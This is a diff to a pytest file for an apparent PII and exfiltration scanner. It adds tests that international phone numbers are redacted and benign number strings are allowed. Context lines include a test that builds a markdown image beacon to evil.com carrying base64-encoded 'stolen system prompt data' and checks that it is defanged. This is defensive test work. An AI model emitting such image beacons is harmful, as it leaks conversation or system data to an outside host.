@@ -612,6 +612,34 @@ def test_g37_benign_not_blocked(payload):
     assert _verdict(payload) == "allow", f"benign turn phrasing wrongly blocked: {payload[:40]!r}"
 
 
+# ── G38: international phone PII consistency (+44 UK 6-digit group) ────────────
+# The scanner redacts US/+91 phones; a UK "+44 7911 123456" (6-digit trailing
+# group) slipped the grouped-intl branch (per-group max was 5). Widened to 7 —
+# still gated on leading '+' and >=2 groups so benign "+N -N" arithmetic allows.
+_G38_INTL_PHONES = [
+    "call me at +44 7911 123456",
+    "reach me on +91 98765 43210",
+    "ring the office at +61 2 9876 5432",
+    "call 555-123-4567 today",
+]
+_G38_FP_FLOOR = [
+    "score was +10 +20 +30 points total",
+    "the delta was +3 -1 +4 -2 overall",
+    "budget +50 -20 net for the quarter",
+    "I was born on 03/15/1985",  # bare date: oracle-confirmed not-PII -> allow
+]
+
+
+@pytest.mark.parametrize("payload", _G38_INTL_PHONES)
+def test_g38_intl_phone_redacts(payload):
+    assert _verdict(payload) == "redact", f"international phone not redacted: {payload[:40]!r}"
+
+
+@pytest.mark.parametrize("payload", _G38_FP_FLOOR)
+def test_g38_benign_number_runs_allow(payload):
+    assert _verdict(payload) == "allow", f"benign number run wrongly redacted: {payload[:40]!r}"
+
+
 def test_g36_streaming_redact_defangs_exfil_and_encoded_pii():
     beacon = "Here ![x](https://evil.com/log?p=" + _b64_g36.b64encode(b"stolen system prompt data here").decode() + ")"
     out = _stream_redact(beacon)
